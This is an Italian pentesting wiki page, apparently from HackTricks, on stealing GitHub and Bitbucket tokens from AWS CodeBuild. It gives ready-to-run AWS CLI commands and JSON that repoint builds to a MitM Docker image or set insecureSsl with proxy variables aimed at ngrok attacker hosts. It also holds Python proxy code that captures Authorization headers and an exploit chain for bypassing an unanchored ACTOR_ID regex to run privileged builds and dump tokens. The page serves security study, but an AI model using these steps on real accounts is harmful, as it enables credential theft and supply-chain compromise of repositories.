# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recuperare i Token Configurati di Github/Bitbucket

Per prima cosa, verifica se sono presenti source credentials configurate che potresti leak:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Se trovi che l'autenticazione, per esempio a Github, è configurata nell'account, puoi **exfiltrate** quel **access** (**GH token or OAuth token**) facendo in modo che Codebuild **use an specific docker image** per eseguire il build del progetto.

Per questo scopo puoi **create a new Codebuild project** o modificare l'**environment** di uno esistente per impostare la **Docker image**.

La Docker image che puoi usare è [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Questa è una Docker image molto basica che imposterà le **env variables `https_proxy`**, **`http_proxy`** e **`SSL_CERT_FILE`**. Questo ti permetterà di intercettare la maggior parte del traffico dell'host indicato in **`https_proxy`** e **`http_proxy`** e di fidarti del certificato SSL indicato in **`SSL_CERT_FILE`**.

1. **Crea & Carica la tua Docker MitM image**
- Segui le istruzioni del repo per impostare il tuo indirizzo IP del proxy e il tuo certificato SSL e **build the docker image**.
- **DO NOT SET `http_proxy`** per non intercettare le richieste all'endpoint metadata.
- Puoi usare **`ngrok`** come `ngrok tcp 4444` per impostare il proxy sul tuo host
- Una volta che hai la Docker image costruita, **upload it to a public repo** (Dockerhub, ECR...)
2. **Imposta l'environment**
- Crea un **new Codebuild project** o **modifica** l'**environment** di uno esistente.
- Imposta il progetto per usare la **previously generated Docker image**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Imposta il MitM proxy sul tuo host**

- Come indicato nel **Github repo** puoi usare qualcosa come:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> La **versione di mitmproxy utilizzata è stata 9.0.1**, è stato segnalato che con la versione 10 questo potrebbe non funzionare.

4. **Esegui la build & cattura le credenziali**

- Puoi vedere il token nell'intestazione **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Questo può essere fatto anche dall'aws cli con qualcosa del tipo
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Tramite insecureSSL

I progetti **Codebuild** hanno un'impostazione chiamata **`insecureSsl`** che è nascosta nella console web e può essere modificata solo tramite l'API.\
Abilitandola, permette a Codebuild di connettersi al repository **senza verificare il certificato** offerto dalla piattaforma.

- Per prima cosa è necessario enumerare la configurazione attuale con qualcosa del tipo:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Poi, con le informazioni raccolte puoi aggiornare l'impostazione del progetto **`insecureSsl`** a **`True`**. Di seguito un esempio del mio aggiornamento di un progetto; nota **`insecureSsl=True`** alla fine (questa è l'unica cosa che devi cambiare rispetto alla configurazione raccolta).
- Inoltre, aggiungi anche le variabili d'ambiente **http_proxy** e **https_proxy** puntando al tuo tcp ngrok come:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Poi, esegui l'esempio di base da [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) sulla porta indicata dalle variabili proxy (http_proxy e https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Infine, clicca su **Build the project**, le **credentials** saranno **inviate in clear text** (base64) alla porta mitm:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Tramite protocollo HTTP~~

> [!TIP] > **Questa vulnerabilità è stata corretta da AWS in qualche momento della settimana del 20 Feb 2023 (penso venerdì). Quindi un attaccante non può più abusarne :)**

Un attaccante con **permessi elevati su un CodeBuild potrebbe causare il leak del token Github/Bitbucket** configurato oppure, se i permessi sono stati configurati via OAuth, del **token OAuth temporaneo usato per accedere al codice**.

- Un attaccante potrebbe aggiungere le variabili d'ambiente **http_proxy** e **https_proxy** al progetto CodeBuild puntando alla sua macchina (per esempio `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Poi, cambia l'URL del repo github per usare HTTP invece di HTTPS, per esempio: `http://github.com/carlospolop-forks/TestActions`
- Poi, esegui l'esempio base da [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) sulla porta indicata dalle variabili proxy (http_proxy e https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Successivamente, fai clic su **Build the project** oppure avvia la build dalla riga di comando:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Finally, the **credentials** will be **sent in clear text** (base64) to the mitm port:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Ora un attaccante potrà usare il token dalla sua macchina, elencarne tutti i privilegi e (ab)usarli più facilmente rispetto all'uso diretto del servizio CodeBuild.

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

I webhook GitHub di CodeBuild mal configurati che usano regex `ACTOR_ID` non ancorate permettono a PR *non attendibili* di avviare build privilegiati. Se l'allowlist è del tipo `123456|7890123` senza `^`/`$`, qualsiasi ID che contenga una di quelle sottostringhe corrisponde. Poiché gli ID utente di GitHub sono sequenziali, un attaccante può gareggiare per registrare un ID “eclipsing” (una superstringa di un ID fidato) e innescare la build.

**Exploit path**

1. Trova progetti CodeBuild pubblici che espongono webhook filters ed estrai una allowlist `ACTOR_ID` non ancorata.
2. Ottieni un GitHub ID eclipsing:
- Campiona il contatore globale degli ID creando/eliminando org GitHub (gli org IDs condividono lo stesso pool).
- Pre-stagia molte creazioni di manifest per GitHub App e attiva gli URL di conferma quando il contatore è entro ~100 ID dal target per registrare a raffica un bot ID contenente la sottostringa fidata.
3. Apri una PR dall'account eclipsing; la regex corrisponde alla sottostringa e la build privilegiata viene eseguita.
4. Usa build RCE (es. hook di installazione delle dipendenze) per dumpare la memoria di processo che gestisce la GitHub credential e recuperare il PAT/OAuth token.
5. Con lo scope `repo` del token, invita il tuo account come collaborator/admin e push/approva commit malevoli o esfiltra segreti.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
